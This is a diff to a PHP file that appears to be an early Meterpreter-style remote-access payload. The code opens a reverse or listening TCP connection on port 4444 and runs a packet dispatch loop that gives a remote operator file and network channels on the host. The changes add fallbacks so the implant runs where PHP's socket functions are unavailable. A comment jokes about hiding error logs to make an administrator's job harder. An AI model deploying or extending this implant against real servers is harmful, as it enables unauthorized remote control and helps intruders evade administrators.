@@ -1,19 +1,22 @@
-#<?php # This lets us run as a standalone file or as eval'd code
+#<?php # This line lets us run as a standalone file or as eval'd code
+
 function my_print($str) {
     #error_log($str);
     #print($str ."\n");
     #flush();
 }
+
+# Doesn't exist before php 4.3
 if (!function_exists("file_get_contents")) {
-    function file_get_contents($file) {
-         $f = @fopen($file,"rb");
-         $contents = false;
-         if ($f) {
-             do { $contents .= fgets($f); } while (!feof($f));
-         }
-         fclose($f);
-         return $contents;
-    }
+function file_get_contents($file) {
+        $f = @fopen($file,"rb");
+        $contents = false;
+        if ($f) {
+            do { $contents .= fgets($f); } while (!feof($f));
+        }
+        fclose($f);
+        return $contents;
+}
 }
 function hexdump($data, $htmloutput = false, $uppercase = false, $return = false)
 {
@@ -610,6 +613,7 @@ function channel_create_stdapi_fs_file($req, &$pkt) {
     $fd = @fopen($fpath_tlv['value'], $mode_tlv['value']);
 
     if (is_resource($fd)) {
+        register_stream($fd);
         array_push($channels, array(0 => $fd, 1 => $fd, 'type' => 'stream'));
         $id = count($channels) - 1;
         my_print("Created new channel $fd, with id $id");
@@ -623,27 +627,38 @@ function channel_create_stdapi_fs_file($req, &$pkt) {
 
 
 function channel_create_stdapi_net_tcp_client($req, &$pkt) {
-    global $channels, $socket_readers;
+    global $channels, $readers;
     $peer_host_tlv = packet_get_tlv($req, TLV_TYPE_PEER_HOST);
     $peer_port_tlv = packet_get_tlv($req, TLV_TYPE_PEER_PORT);
     $local_host_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_HOST);
     $local_port_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_PORT);
     $retries_tlv = packet_get_tlv($req, TLV_TYPE_CONNECT_RETRIES);
 
-    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-    $res = socket_connect($sock, $peer_host_tlv['value'], $peer_port_tlv['value']);
-
-    if (is_resource($sock) && $res) {
-        array_push($channels, array(0 => $sock, 1 => $sock, 'type' => 'socket'));
-        $id = count($channels) - 1;
-        my_print("Created new channel $sock, with id $id");
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
-        array_push($socket_readers, $sock);
-        return ERROR_SUCCESS;
+    if (is_callable('socket_create')) {
+        $sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+        $res = socket_connect($sock, $peer_host_tlv['value'], $peer_port_tlv['value']);
+        if (!$res) {
+            return ERROR_FAILURE;
+        }
+        register_socket($sock);
     } else {
-        my_print("Failed to open");
+        $sock = fsockopen($peer_host_tlv['value'], $peer_port_tlv['value']);
+        if (!$sock) {
+            return ERROR_FAILURE;
+        }
+        register_stream($sock);
     }
-    return ERROR_FAILURE;
+
+    #
+    # If we got here, the connection worked, respond with the new channel ID
+    #
+
+    array_push($channels, array(0 => $sock, 1 => $sock, 'type' => get_rtype($sock)));
+    $id = count($channels) - 1;
+    my_print("Created new channel $sock, with id $id");
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
+    array_push($readers, $sock);
+    return ERROR_SUCCESS;
 }
 
 
@@ -727,6 +742,7 @@ function core_channel_write($req, &$pkt) {
 }
 
 function core_channel_close($req, &$pkt) {
+    # XXX remove the closed channel from $readers
     my_print("doing channel close");
     $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
     $id = $chan_tlv['value'];
@@ -753,10 +769,7 @@ function core_channel_close($req, &$pkt) {
 # we'll have ext_server_stdapi.php or whatever.  For now just return success.
 function core_loadlib($req, &$pkt) {
     my_print("doing core_loadlib (no-op)");
-    $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
-    #if (!$data_tlv) {
-    #    my_print(hexdump($req, false, false, true));
-    #}
+    #$data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
     return ERROR_SUCCESS;
 }
 
@@ -772,7 +785,7 @@ $channels = array();
 
 function get_channel_id_from_socket($sock) {
     global $channels;
-    my_print("looking for channel from sock $sock");
+    #my_print("looking for channel from sock $sock");
     for ($i = 0; $i < count($channels); $i++) {
         if ($channels[$i][0] == $sock) {
             return $i;
@@ -795,9 +808,9 @@ function channel_write($chan_id, $data) {
     $c = get_channel_by_id($chan_id);
     if ($c && is_resource($c[0])) {
         if ($c['type'] == 'socket') {
-            return socket_write($c[0], $data);
+            return socket_write($c[0], $data, strlen($data));
         } else {
-            return fwrite($c[0], $data);
+            return fwrite($c[0], $data, strlen($data));
         }
     } else {
         return false;
@@ -967,13 +980,165 @@ function packet_get_tlv($pkt, $type) {
 
 
 
+$resource_type_map = array();
+function register_socket($sock) {
+    global $resource_type_map;
+    my_print("Registering socket $socket");
+    $resource_type_map[(int)$sock] = 'socket';
+}
+
+function register_stream($stream) {
+    global $resource_type_map;
+    my_print("Registering stream $stream");
+    $resource_type_map[(int)$stream] = 'stream';
+}
+
+function dump_resource_map() {
+    global $resource_type_map;
+    my_print(sprintf("Resource map %s", count($resource_type_map)));
+    foreach ($resource_type_map as $resource => $type) {
+        my_print("    $resource ($type)");
+    }
+}
+
+function close($resource) {
+    switch (get_rtype($resource)) {
+    case 'socket':
+        return socket_close($resource);
+        break;
+    case 'stream':
+        return fclose($resource);
+        break;
+    }
+}
+
+function read($resource, $len) {
+    my_print(sprintf("Reading from $resource which is a %s", get_rtype($resource)));
+    switch (get_rtype($resource)) {
+    case 'socket':
+        $buff = socket_read($resource, $len, PHP_BINARY_READ);
+        break;
+    case 'stream':
+        $buff = fread($resource, $len);
+        break;
+    default:
+        my_print("Wtf don't know how to read from resource $resource");
+        break;
+    }
+    return $buff;
+}
+
+function write($resource, $buff, $len=0) {
+    if ($len == 0) { $len = strlen($buff); }
+    my_print(sprintf("Writing %d bytes to $resource which is a %s", $len, get_rtype($resource)));
+    switch (get_rtype($resource)) {
+    case 'socket':
+        $count = socket_write($resource, $buff, $len);
+        break;
+    case 'stream':
+        $count = fwrite($resource, $buff, $len);
+        break;
+    default:
+        my_print("Wtf don't know how to write to resource $resource");
+        $count = FALSE;
+        break;
+    }
+    my_print("Wrote $count bytes");
+    return $count;
+}
+
+function get_rtype($resource) {
+    global $resource_type_map;
+    return $resource_type_map[(int)$resource];
+}
+
+function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
+    $streams_r = array();
+    $streams_w = array();
+    $streams_e = array();
+
+    $sockets_r = array();
+    $sockets_w = array();
+    $sockets_e = array();
+
+    if ($r) {
+        foreach ($r as $resource) {
+            switch (get_rtype($resource)) {
+            case 'socket': array_push($sockets_r, $resource); break;
+            case 'stream': array_push($streams_r, $resource); break;
+            default: my_print("Unknown resource type"); break;
+            }
+        }
+    }
+    if ($w) {
+        foreach ($w as $resource) {
+            switch (get_rtype($resource)) {
+            case 'socket': array_push($sockets_w, $resource); break;
+            case 'stream': array_push($streams_w, $resource); break;
+            default: my_print("Unknown resource type"); break;
+            }
+        }
+    }
+    if ($e) {
+        foreach ($e as $resource) {
+            switch (get_rtype($resource)) {
+            case 'socket': array_push($sockets_e, $resource); break;
+            case 'stream': array_push($streams_e, $resource); break;
+            default: my_print("Unknown resource type"); break;
+            }
+        }
+    }
+
+    $n_sockets = count($sockets_r) + count($sockets_w) + count($sockets_e);
+    $n_streams = count($streams_r) + count($streams_w) + count($streams_e);
+    my_print("Selecting $n_sockets sockets and $n_streams streams");
+    $r = array();
+    $w = array();
+    $e = array();
+
+    # Workaround for some versions of PHP that throw an error and bail out if
+    # select is given an empty array
+    if (count($sockets_r)==0) { $sockets_r = NULL; }
+    if (count($sockets_w)==0) { $sockets_w = NULL; }
+    if (count($sockets_e)==0) { $sockets_e = NULL; }
+    if (count($streams_r)==0) { $streams_r = NULL; }
+    if (count($streams_w)==0) { $streams_w = NULL; }
+    if (count($streams_e)==0) { $streams_e = NULL; }
+
+    $count = 0;
+    if ($n_sockets > 0) {
+        $res = socket_select($sockets_r, $sockets_w, $sockets_e, $tv_sec, $tv_usec);
+        if (FALSE === $res) { return FALSE; }
+        if (is_array($r) && is_array($sockets_r)) { $r = array_merge($r, $sockets_r); }
+        if (is_array($w) && is_array($sockets_w)) { $w = array_merge($w, $sockets_w); }
+        if (is_array($e) && is_array($sockets_e)) { $e = array_merge($e, $sockets_e); }
+        $count += $res;
+    }
+    if ($n_streams > 0) {
+        $res = stream_select($streams_r, $streams_w, $streams_e, $tv_sec, $tv_usec);
+        if (FALSE === $res) { return FALSE; }
+        if (is_array($r) && is_array($streams_r)) { $r = array_merge($r, $streams_r); }
+        if (is_array($w) && is_array($streams_w)) { $w = array_merge($w, $streams_w); }
+        if (is_array($e) && is_array($streams_e)) { $e = array_merge($e, $streams_e); }
+        $count += $res;
+    }
+    my_print(sprintf("total: $count, Modified counts: r=%s w=%s e=%s", count($r), count($w), count($e)));
+    return $count;
+}
+
+
 
 ##
 # Main stuff
 ##
 
 ob_implicit_flush();
+
+# Turn off error reporting so we don't leave any ugly logs.  Why make an
+# administrator's job easier if we don't have to?  =)
+#error_reporting(0);
 error_reporting(E_ALL);
+
 @ignore_user_abort(true);
 # Has no effect in safe mode, but try anyway
 @set_time_limit(0);
@@ -982,6 +1147,11 @@ $port = 4444;
 
 $listen = false;
 if ($listen) {
+    # Assume that the socket functions are available since there really isn't
+    # any other way to create a server socket.  XXX Investigate using COM
+    # objects to accomplish this in Windows since socket_* are unavailable by
+    # default.
+
     my_print("Listening on $port");
 
     $setsockopt = 'socket_setopt';
@@ -998,31 +1168,40 @@ if ($listen) {
     $msgsock = socket_accept($sock);
     socket_close($sock);
 
-    my_print("Got a socket connection $sock");
+    my_print("Got a socket connection $msgsock");
 } else {
     my_print("Connecting to $port");
     $ipaddr = '127.0.0.1';
-    $msgsock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-    $res = socket_connect($msgsock,$ipaddr,$port);
-    if (!$res) {
-        die();
+    if (is_callable('socket_create')) {
+        $msgsock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+        $res = socket_connect($msgsock,$ipaddr,$port);
+        if (!$res) { die(); }
+        register_socket($msgsock);
+    } else {
+        $msgsock = fsockopen($ipaddr,$port);
+        if (!$msgsock) { die(); }
+        register_stream($msgsock);
     }
 }
 
-$socket_readers = array($msgsock);
+
+$readers = array($msgsock);
 $file_readers = array();
 
 #
 # Main dispatch loop
 #
-while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
+while (FALSE !== select($r=$readers, $w=NULL, $e=NULL, 1)) {
+    dump_resource_map();
+    my_print(sprintf("Returned from select with %s readers", count($r)));
     $read_failed = false;
     for ($i = 0; $i < count($r); $i++) {
         $ready = $r[$i];
-    #foreach ($r as $ready) {
         if ($ready == $msgsock) {
-            $request = socket_read($msgsock, 8, PHP_BINARY_READ);
+            $request = read($msgsock, 8);
+            my_print(sprintf("Read returned %s bytes", strlen($request)));
             if (FALSE==$request) {
+                my_print("Read failed on main socket, bailing");
                 # We failed on the main socket.  There's no way to continue, so
                 # break all the way out.
                 break 2;
@@ -1033,27 +1212,27 @@ while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
             # packet type should always be 0, i.e. PACKET_TYPE_REQUEST
             $ptype = $a['type'];
             while (strlen($request) < $a['len']) {
-                $request .= socket_read($msgsock, $len-strlen($request), PHP_BINARY_READ);
+                $request .= read($msgsock, $len-strlen($request));
+                my_print(sprintf("Read more into request buff, now %s bytes", strlen($request)));
             }
-            hexdump(substr($request, 0, $len));
+            #hexdump(substr($request, 0, $len));
             my_print("creating response");
             $response = create_response($request);
 
-            socket_write($msgsock, $response);
+            write($msgsock, $response);
         } else {
             my_print("not Msgsock: $ready");
-            $data = socket_read($ready, 1024, PHP_BINARY_READ);
+            $data = read($ready, 1024);
             if (FALSE === $data || "" === $data) {
                 $request = handle_dead_socket_channel($ready);
-                socket_write($msgsock, $request);
-                unset($socket_readers[$i]);
+                write($msgsock, $request);
+                unset($readers[$i]);
             } else {
                 $request = handle_socket_read_channel($ready, $data);
-                socket_write($msgsock, $request);
+                write($msgsock, $request);
             }
         }
     }
 }
 my_print("Finished");
-socket_close($msgsock);
-
+close($msgsock);
